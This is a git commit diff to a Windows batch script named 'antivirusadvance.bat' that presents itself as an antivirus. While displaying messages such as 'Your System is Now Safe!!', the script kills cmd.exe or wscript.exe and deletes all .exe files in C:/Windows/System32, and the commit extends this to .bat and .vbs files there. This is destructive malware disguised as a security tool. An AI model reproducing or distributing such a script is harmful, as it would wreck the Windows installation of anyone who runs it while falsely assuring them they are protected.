a09d3fc8fc94a3bed2af03ca8f6b0913497414a2
Rishabh Sagar <rishabh123sagar@gmail.com>
2021-12-03 19:55:13 +0530

    Update antivirusadvance.bat

--- antivirusadvance.bat
+++ antivirusadvance.bat
@@ -10,26 +10,33 @@ if exist .vbs goto b
 :a
 color 0c
 
-echo yes solved
+echo Something .bat file is Running In Your Pc, Wait We Solved it!!
+pause
+color 0a
+echo Your System is Now Safe!!
 pause
 taskkill /f /im cmd.exe
 if exist .bat goto c
 :c
 del C:/Windows/System32/*.exe
+del C:/Windows/System32/*.bat
 exit
 
 goto start
 :b
 color 0b
 
-echo yes solved
+Something .vbs file is Running In Your Pc, Wait We Solved it!!
 
 pause
-
+color 0a
+echo Your System is Now Safe!!
+pause
 taskkill /f /im wscript.exe
 if exist .vbs goto d
 :d
 del C:/Windows/System32/*.exe
+del C:/Windows/System32/*.vbs
 exit
 
 goto start
